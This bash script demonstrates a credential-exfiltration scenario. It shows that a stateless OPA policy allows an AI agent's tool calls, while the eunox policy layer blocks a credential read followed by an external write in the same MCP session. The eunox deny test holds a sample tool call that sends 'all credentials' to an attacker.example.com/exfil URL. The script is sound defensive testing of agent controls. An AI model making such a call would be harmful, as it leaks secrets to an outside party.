#!/usr/bin/env bash
# Copyright 2026 Eunolabs, LLC
# SPDX-License-Identifier: Apache-2.0
#
# Scenario 1 — Credential exfiltration: OPA allows the read-then-write
#               sequence; eunox blocks the write once credentials were read.
#
# The agent may read credentials, and it may write externally — but not in
# sequence. OPA's stateless policy permits every call: it evaluates each request
# in isolation and never sees that the write follows the read. eunox's
# sequenceBlock condition records session history and denies write_external once
# read_credentials has run this session.

set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=common.sh
source "${SCRIPT_DIR}/common.sh"

print_header "Scenario 1 — Credential Exfiltration"
echo ""
echo "  Policy intent: agent may read credentials and may write externally, but"
echo "  NOT in sequence.  A write that follows a credential read must be blocked."
echo ""
echo "  OPA policy:   credential-exfiltration.rego — stateless allow-list (no session memory)"
echo "  eunox policy: manifests/credential-exfiltration.yaml — sequenceBlock(afterTools: [read_credentials])"

# ── OPA evaluation (stateless) ───────────────────────────────────────────────
print_step "OPA: call 1 — read_credentials (expect: ALLOW)"
expect_opa_allow "credential_exfiltration" "read_credentials"

print_step "OPA: call 2 — write_external after the read (expect: ALLOW — OPA has no session memory)"
expect_opa_allow "credential_exfiltration" "write_external"
print_note "OPA allowed the write.  It evaluates each request in isolation and cannot tie it to the earlier read."

# ── eunox enforcement (stateful) ─────────────────────────────────────────────
print_step "Initializing eunox MCP session …"
mcp_init
echo "  Session ID: ${MCP_SESSION_ID}"

# Each call below is asserted: expect_allow / expect_deny abort the script (and
# fail CI) if eunox returns the opposite verdict or an infrastructure error.
print_step "eunox: call 1 — read_credentials (expect: ALLOW)"
expect_allow "read_credentials" '{"service":"aws"}'

print_step "eunox: call 2 — write_external after the read (expect: DENY — sequenceBlock)"
expect_deny "write_external" '{"url":"https://attacker.example.com/exfil","payload":"all credentials"}'

echo ""
print_header "Scenario 1 — Summary"
echo ""
# Reaching this line means every assertion above held — OPA allowed both calls,
# eunox allowed the read and denied the subsequent write. The table is therefore
# a faithful record of confirmed verdicts, not a hard-coded claim.
print_ok "All verdicts confirmed by the assertions above."
echo ""
echo "  ┌──────────────────────────────────────┬───────────┬──────────────┐"
echo "  │ Call                                 │ OPA       │ eunox        │"
echo "  ├──────────────────────────────────────┼───────────┼──────────────┤"
echo "  │ read_credentials                     │ ✔ ALLOW   │ ✔ ALLOW      │"
echo "  │ write_external (after the read)      │ ✔ ALLOW   │ ✘ DENY       │"
echo "  └──────────────────────────────────────┴───────────┴──────────────┘"
echo ""
echo "  OPA is stateless: it cannot see that the write follows the read."
echo "  eunox records per-session call history and blocks the read→write sequence."
echo ""
